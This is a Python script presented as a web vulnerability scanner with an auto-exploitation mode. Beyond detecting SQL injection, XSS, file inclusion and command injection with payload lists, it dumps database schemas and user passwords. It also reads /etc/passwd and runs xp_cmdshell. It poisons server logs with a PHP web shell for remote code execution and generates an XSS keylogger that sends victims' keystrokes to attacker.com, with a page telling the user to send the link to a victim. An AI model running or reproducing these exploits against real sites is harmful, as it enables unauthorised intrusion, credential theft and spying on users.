#!/usr/bin/env python3
import argparse
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import json
import os
import datetime
import base64
import re
import html

# Initialize colorama
init(autoreset=True)

# ==============================================
# CONFIGURATION
# ==============================================
BANNER = f"""
{Fore.BLUE}+{'='*50}+
{Fore.BLUE}|{Style.BRIGHT}{Fore.CYAN}{'WEB VULNERABILITY SCANNER V1':^50}{Fore.BLUE}|
{Fore.BLUE}|{Style.NORMAL}{Fore.YELLOW}{'TOOLS BY XENAALANGLISS':^50}{Fore.BLUE}|
{Fore.BLUE}|{Fore.GREEN}{'THANKS FOR USING THIS SCRIPT.':^50}{Fore.BLUE}|
{Fore.BLUE}+{'='*50}+{Style.RESET_ALL}
"""

class UltimateScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.vulnerabilities = []
        self.exploit_results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) Scanner/3.0',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        self.report_dir = "reports"
        self.poc_dir = f"{self.report_dir}/poc"
        self.verbose = False

    # ==============================================
    # SCANNING MODULES (ENHANCED)
    # ==============================================
    def scan_sqli(self):
        """Advanced SQL Injection detection with more payloads"""
        test_params = ['id', 'user', 'product', 'category', 'page', 'file']
        payloads = [
            "'", "\"", 
            "' OR '1'='1", 
            "' WAITFOR DELAY '0:0:5'--", 
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=1-- -",
            "' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
            "' AND 1=0 UNION SELECT 1,2,3,4,5,6-- -"
        ]
        
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target}/?{param}=1{payload}"
                try:
                    start_time = datetime.datetime.now()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = (datetime.datetime.now() - start_time).total_seconds()
                    
                    # Time-based detection
                    if elapsed > 4 and "' WAITFOR DELAY" in payload:
                        self._log_vulnerability(
                            "SQL Injection (Time-Based)", 
                            "Critical", 
                            test_url,
                            payload
                        )
                        return True
                    
                    # Error-based detection
                    errors = [
                        "SQL syntax", "unclosed quotation", "quoted string",
                        "conversion failed", "mysql_fetch", "syntax error",
                        "SQL Server", "ODBC Driver", "ORA-"
                    ]
                    if any(error.lower() in response.text.lower() for error in errors):
                        self._log_vulnerability(
                            "SQL Injection (Error-Based)", 
                            "Critical", 
                            test_url,
                            payload
                        )
                        return True
                        
                    # Boolean-based detection
                    true_page = response.text
                    false_url = f"{self.target}/?{param}=1 AND 1=0"
                    false_page = self.session.get(false_url).text
                    if true_page != false_page:
                        self._log_vulnerability(
                            "SQL Injection (Boolean-Based)", 
                            "Critical", 
                            test_url,
                            payload
                        )
                        return True
                        
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}[DEBUG] Error testing {test_url}: {e}{Style.RESET_ALL}")
                    continue
        return False

    def scan_xss(self):
        """Enhanced XSS detection with DOM-based checks"""
        test_payloads = [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "{{7*7}}",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>"
        ]
        
        for payload in test_payloads:
            test_url = f"{self.target}/search?q={payload}"
            try:
                response = self.session.get(test_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Check if payload appears in response
                if payload in response.text:
                    self._log_vulnerability(
                        "Cross-Site Scripting (XSS)", 
                        "High", 
                        test_url,
                        payload
                    )
                    return True
                
                # Check for DOM-based XSS
                scripts = soup.find_all('script')
                for script in scripts:
                    if payload in str(script):
                        self._log_vulnerability(
                            "DOM-Based XSS", 
                            "High", 
                            test_url,
                            payload
                        )
                        return True
                        
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[DEBUG] Error testing {test_url}: {e}{Style.RESET_ALL}")
                continue
        return False

    def scan_lfi(self):
        """Advanced LFI detection with path traversal"""
        test_files = [
            "/etc/passwd",
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../Windows/System32/drivers/etc/hosts",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for file in test_files:
            test_url = f"{self.target}/?page={file}"
            try:
                response = self.session.get(test_url)
                
                # Common LFI signatures
                lfi_signatures = [
                    "root:x:0:0:",
                    "[extensions]",
                    "DocumentRoot",
                    "<?php",
                    "boot loader"
                ]
                
                if any(sig in response.text for sig in lfi_signatures):
                    self._log_vulnerability(
                        "Local File Inclusion", 
                        "High", 
                        test_url,
                        file
                    )
                    return True
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[DEBUG] Error testing {test_url}: {e}{Style.RESET_ALL}")
                continue
        return False

    def scan_rce(self):
        """Remote Code Execution detection"""
        payloads = [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "|| id",
            "&& id",
            "<?php system($_GET['cmd']); ?>"
        ]
        
        for payload in payloads:
            test_url = f"{self.target}/?cmd={payload}"
            try:
                response = self.session.get(test_url)
                
                # Common RCE signatures
                rce_signatures = [
                    "uid=",
                    "gid=",
                    "groups=",
                    "www-data",
                    "Microsoft Windows"
                ]
                
                if any(sig in response.text for sig in rce_signatures):
                    self._log_vulnerability(
                        "Remote Code Execution", 
                        "Critical", 
                        test_url,
                        payload
                    )
                    return True
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[DEBUG] Error testing {test_url}: {e}{Style.RESET_ALL}")
                continue
        return False

    # ==============================================
    # POWERFUL EXPLOITATION MODULES
    # ==============================================
    def exploit_sqli(self, vuln):
        """Advanced SQLi exploitation with database takeover"""
        print(f"{Fore.YELLOW}[*] Launching advanced SQLi exploitation...{Style.RESET_ALL}")
        
        # Database fingerprinting
        db_type = self._fingerprint_db(vuln['url'])
        if not db_type:
            print(f"{Fore.RED}[-] Could not identify database type{Style.RESET_ALL}")
            return False
            
        print(f"{Fore.CYAN}[*] Identified database: {db_type}{Style.RESET_ALL}")
        
        # Database-specific exploitation
        if "mysql" in db_type.lower():
            return self._exploit_mysql(vuln)
        elif "mssql" in db_type.lower():
            return self._exploit_mssql(vuln)
        elif "oracle" in db_type.lower():
            return self._exploit_oracle(vuln)
        else:
            return self._exploit_generic(vuln)

    def _fingerprint_db(self, url):
        """Identify database type"""
        tests = [
            ("' AND 1=0 UNION SELECT 1,@@version,3-- -", ["mysql", "mariadb"]),
            ("' AND 1=0 UNION SELECT 1,version(),3-- -", ["postgresql"]),
            ("' AND 1=0 UNION SELECT 1,banner,3 FROM v$version-- -", ["oracle"]),
            ("' AND 1=0 UNION SELECT 1,@@version,3-- -", ["mssql", "sql server"])
        ]
        
        for payload, db_types in tests:
            test_url = url.split('=')[0] + f"={payload}"
            try:
                response = self.session.get(test_url)
                for db_type in db_types:
                    if db_type in response.text.lower():
                        return db_type
            except:
                continue
        return "unknown"

    def _exploit_mysql(self, vuln):
        """MySQL-specific exploitation"""
        success = False
        
        # Dump database schema
        schema_payload = "' UNION SELECT 1,table_name,column_name FROM information_schema.columns WHERE table_schema=database()-- -"
        exploit_url = vuln['url'].split('=')[0] + f"={schema_payload}"
        
        try:
            response = self.session.get(exploit_url)
            if response.status_code == 200:
                poc_file = f"{self.poc_dir}/mysql_schema.txt"
                with open(poc_file, 'w') as f:
                    f.write(response.text)
                
                self.exploit_results.append({
                    "type": "MySQL Schema Dump",
                    "success": True,
                    "poc_file": os.path.abspath(poc_file),
                    "details": "Extracted database schema via UNION attack"
                })
                print(f"{Fore.GREEN}[+] Database schema dumped to {poc_file}{Style.RESET_ALL}")
                success = True
        except Exception as e:
            print(f"{Fore.RED}[-] Schema dump failed: {str(e)}{Style.RESET_ALL}")
        
        # Attempt file read
        file_read_payload = "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
        exploit_url = vuln['url'].split('=')[0] + f"={file_read_payload}"
        
        try:
            response = self.session.get(exploit_url)
            if "root:" in response.text:
                poc_file = f"{self.poc_dir}/mysql_file_read.txt"
                with open(poc_file, 'w') as f:
                    f.write(response.text)
                
                self.exploit_results.append({
                    "type": "MySQL File Read",
                    "success": True,
                    "poc_file": os.path.abspath(poc_file),
                    "details": "Read /etc/passwd via LOAD_FILE()"
                })
                print(f"{Fore.GREEN}[+] File read successful! Saved to {poc_file}{Style.RESET_ALL}")
                success = True
        except:
            pass
            
        return success

    def _exploit_mssql(self, vuln):
        """MSSQL-specific exploitation"""
        success = False
        
        # Execute OS commands via xp_cmdshell
        cmd_payload = "'; EXEC xp_cmdshell('whoami')-- -"
        exploit_url = vuln['url'].split('=')[0] + f"={cmd_payload}"
        
        try:
            response = self.session.get(exploit_url)
            if "nt authority" in response.text.lower():
                poc_file = f"{self.poc_dir}/mssql_cmdshell.txt"
                with open(poc_file, 'w') as f:
                    f.write(response.text)
                
                self.exploit_results.append({
                    "type": "MSSQL Command Execution",
                    "success": True,
                    "poc_file": os.path.abspath(poc_file),
                    "details": "Executed OS commands via xp_cmdshell"
                })
                print(f"{Fore.GREEN}[+] Command execution successful! Saved to {poc_file}{Style.RESET_ALL}")
                success = True
        except Exception as e:
            print(f"{Fore.RED}[-] Command execution failed: {str(e)}{Style.RESET_ALL}")
            
        return success

    def _exploit_oracle(self, vuln):
        """Oracle-specific exploitation"""
        print(f"{Fore.YELLOW}[*] Attempting Oracle database exploitation...{Style.RESET_ALL}")
        
        # Get database version
        version_payload = "' AND 1=0 UNION SELECT 1,banner,3 FROM v$version-- -"
        exploit_url = vuln['url'].split('=')[0] + f"={version_payload}"
        
        try:
            response = self.session.get(exploit_url)
            if "Oracle" in response.text:
                poc_file = f"{self.poc_dir}/oracle_version.txt"
                with open(poc_file, 'w') as f:
                    f.write(response.text)
                
                self.exploit_results.append({
                    "type": "Oracle Version",
                    "success": True,
                    "poc_file": os.path.abspath(poc_file),
                    "details": "Extracted Oracle version information"
                })
                print(f"{Fore.GREEN}[+] Oracle version extracted! Saved to {poc_file}{Style.RESET_ALL}")
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] Oracle exploit failed: {str(e)}{Style.RESET_ALL}")
        
        return False

    def _exploit_generic(self, vuln):
        """Generic SQL injection exploitation"""
        print(f"{Fore.YELLOW}[*] Attempting generic SQLi exploitation...{Style.RESET_ALL}")
        
        # Basic data extraction
        union_payload = f"' UNION SELECT 1,concat(username,':',password),3 FROM users-- -"
        exploit_url = vuln['url'].split('=')[0] + f"={union_payload}"
        
        try:
            response = self.session.get(exploit_url)
            if response.status_code == 200:
                poc_file = f"{self.poc_dir}/generic_sqli_data.txt"
                with open(poc_file, 'w') as f:
                    f.write(response.text)
                
                self.exploit_results.append({
                    "type": "Generic SQL Injection",
                    "success": True,
                    "poc_file": os.path.abspath(poc_file),
                    "details": "Extracted data via UNION attack"
                })
                print(f"{Fore.GREEN}[+] Data extraction successful! Saved to {poc_file}{Style.RESET_ALL}")
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] Exploit failed: {str(e)}{Style.RESET_ALL}")
        
        return False

    def exploit_xss(self, vuln):
        """Advanced XSS exploitation with keylogger"""
        print(f"{Fore.YELLOW}[*] Preparing advanced XSS exploitation...{Style.RESET_ALL}")
        
        # Generate keylogger payload
        keylogger_js = """
        <script>
        var keys = '';
        document.onkeypress = function(e) {
            keys += String.fromCharCode(e.keyCode);
            new Image().src = 'http://attacker.com/log?k=' + keys;
        }
        </script>
        """
        
        # Generate phishing page
        exploit_url = vuln['url'].split('=')[0] + f"={keylogger_js}"
        poc_file = f"{self.poc_dir}/xss_keylogger.html"
        
        with open(poc_file, 'w') as f:
            f.write(f"""<html>
            <head><title>XSS Exploit</title></head>
            <body>
                <h1>XSS Keylogger Exploit</h1>
                <p>Send this URL to victim:</p>
                <input type="text" value="{exploit_url}" style="width:80%">
                <p>This payload will log all keystrokes to attacker server</p>
                {keylogger_js}
            </body>
            </html>""")
        
        self.exploit_results.append({
            "type": "XSS Keylogger",
            "success": True,
            "poc_file": os.path.abspath(poc_file),
            "details": "Generated keylogger payload"
        })
        print(f"{Fore.GREEN}[+] XSS keylogger generated: {poc_file}{Style.RESET_ALL}")
        return True

    def exploit_lfi(self, vuln):
        """Advanced LFI exploitation with log poisoning"""
        print(f"{Fore.YELLOW}[*] Attempting LFI to RCE via log poisoning...{Style.RESET_ALL}")
        
        # Try to find log files
        log_files = [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/httpd/access_log"
        ]
        
        for log_file in log_files:
            test_url = vuln['url'].split('=')[0] + f"={log_file}"
            try:
                response = self.session.get(test_url)
                if "Apache" in response.text or "GET /" in response.text:
                    # Poison the logs
                    poison_url = f"{self.target}/<?php system($_GET['cmd']); ?>"
                    self.session.get(poison_url)
                    
                    # Execute code
                    cmd_url = vuln['url'].split('=')[0] + f"={log_file}&cmd=id"
                    cmd_response = self.session.get(cmd_url)
                    
                    if "uid=" in cmd_response.text:
                        poc_file = f"{self.poc_dir}/lfi_rce.txt"
                        with open(poc_file, 'w') as f:
                            f.write(cmd_response.text)
                        
                        self.exploit_results.append({
                            "type": "LFI to RCE",
                            "success": True,
                            "poc_file": os.path.abspath(poc_file),
                            "details": f"Achieved RCE via {log_file} poisoning"
                        })
                        print(f"{Fore.GREEN}[+] RCE achieved via log poisoning! Saved to {poc_file}{Style.RESET_ALL}")
                        return True
            except:
                continue
                
        print(f"{Fore.RED}[-] Failed to exploit LFI via log poisoning{Style.RESET_ALL}")
        return False

    def _log_vulnerability(self, vuln_type, severity, url, payload):
        """Log discovered vulnerability"""
        self.vulnerabilities.append({
            "type": vuln_type,
            "severity": severity,
            "url": url,
            "payload": payload,
            "timestamp": datetime.datetime.now().isoformat()
        })
        print(f"{Fore.RED}[!] Found {severity} {vuln_type} at {url}{Style.RESET_ALL}")

    def generate_reports(self):
        """Generate comprehensive reports in JSON and TXT formats"""
        if not os.path.exists(self.report_dir):
            os.makedirs(self.report_dir)
            os.makedirs(self.poc_dir)

        # Generate JSON report
        report_data = {
            "target": self.target,
            "scan_date": datetime.datetime.now().isoformat(),
            "vulnerabilities": self.vulnerabilities,
            "exploits": self.exploit_results
        }
        
        json_report = f"{self.report_dir}/scan_results.json"
        with open(json_report, 'w') as f:
            json.dump(report_data, f, indent=4)

        # Generate detailed TXT report
        txt_report = f"{self.report_dir}/scan_report.txt"
        with open(txt_report, 'w') as f:
            f.write("="*80 + "\n")
            f.write(f"ULTIMATE WEB VULNERABILITY SCAN REPORT\n")
            f.write("="*80 + "\n\n")
            f.write(f"Target URL: {self.target}\n")
            f.write(f"Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scan Duration: {datetime.datetime.now().strftime('%H:%M:%S')}\n\n")
            
            f.write("="*80 + "\n")
            f.write("VULNERABILITIES FOUND\n")
            f.write("="*80 + "\n")
            
            if not self.vulnerabilities:
                f.write("No vulnerabilities detected\n")
            else:
                for vuln in self.vulnerabilities:
                    f.write(f"\n[!] {vuln['severity']} {vuln['type']}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"Timestamp: {vuln['timestamp']}\n")
                    f.write("-"*80 + "\n")
            
            f.write("\n" + "="*80 + "\n")
            f.write("EXPLOITATION RESULTS\n")
            f.write("="*80 + "\n")
            
            if not self.exploit_results:
                f.write("No exploits attempted or successful\n")
            else:
                for exploit in self.exploit_results:
                    f.write(f"\n[+] {exploit['type']}\n")
                    f.write(f"Status: {'Successful' if exploit['success'] else 'Failed'}\n")
                    f.write(f"Details: {exploit['details']}\n")
                    f.write(f"PoC File: {exploit['poc_file']}\n")
                    f.write("-"*80 + "\n")
        
        print(f"{Fore.GREEN}[+] Reports generated in {self.report_dir}/ directory{Style.RESET_ALL}")

    def print_summary(self):
        """Print comprehensive scan summary to console"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN SUMMARY{' '*(60-12)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"Target URL: {Fore.YELLOW}{self.target}{Style.RESET_ALL}")
        print(f"Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Vulnerabilities Found: {Fore.RED if self.vulnerabilities else Fore.GREEN}{len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.YELLOW}VULNERABILITY BREAKDOWN:{Style.RESET_ALL}")
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vuln_types[vuln['type']] = vuln_types.get(vuln['type'], 0) + 1
            for vuln_type, count in vuln_types.items():
                print(f"- {vuln_type}: {count}")
        
        if self.exploit_results:
            print(f"\n{Fore.YELLOW}EXPLOITATION RESULTS:{Style.RESET_ALL}")
            for exploit in self.exploit_results:
                status = f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}" if exploit['success'] else f"{Fore.RED}FAILED{Style.RESET_ALL}"
                print(f"- {exploit['type']}: {status}")
                print(f"  Details: {exploit['details']}")
                print(f"  PoC Location: {exploit['poc_file']}")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

    def run_scan(self, exploit_mode=False):
        """Run complete vulnerability scan with all checks"""
        print(BANNER)
        print(f"{Fore.CYAN}[*] Scanning target: {self.target}{Style.RESET_ALL}")
        
        vuln_found = False
        
        # Run all vulnerability checks
        if self.scan_sqli():
            vuln_found = True
            if exploit_mode:
                self.exploit_sqli(self.vulnerabilities[-1])
                
        if self.scan_xss():
            vuln_found = True
            if exploit_mode:
                self.exploit_xss(self.vulnerabilities[-1])
                
        if self.scan_lfi():
            vuln_found = True
            if exploit_mode:
                self.exploit_lfi(self.vulnerabilities[-1])
                
        if self.scan_rce():
            vuln_found = True
            # RCE exploitation would be manual in most cases
            
        if not vuln_found:
            print(f"{Fore.YELLOW}[!] No vulnerabilities found{Style.RESET_ALL}")
        
        # Generate reports
        self.generate_reports()
        self.print_summary()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Ultimate Web Vulnerability Scanner with Advanced Exploits",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "target", 
        help="URL target to scan (e.g., http://example.com)"
    )
    parser.add_argument(
        "-e", "--exploit", 
        action="store_true",
        help="Enable auto-exploitation of found vulnerabilities"
    )
    parser.add_argument(
        "-o", "--output", 
        help="Custom output directory for reports (default: reports)",
        default="reports"
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    scanner = UltimateScanner(args.target)
    scanner.report_dir = args.output
    scanner.poc_dir = f"{args.output}/poc"
    scanner.verbose = args.verbose
    scanner.run_scan(exploit_mode=args.exploit)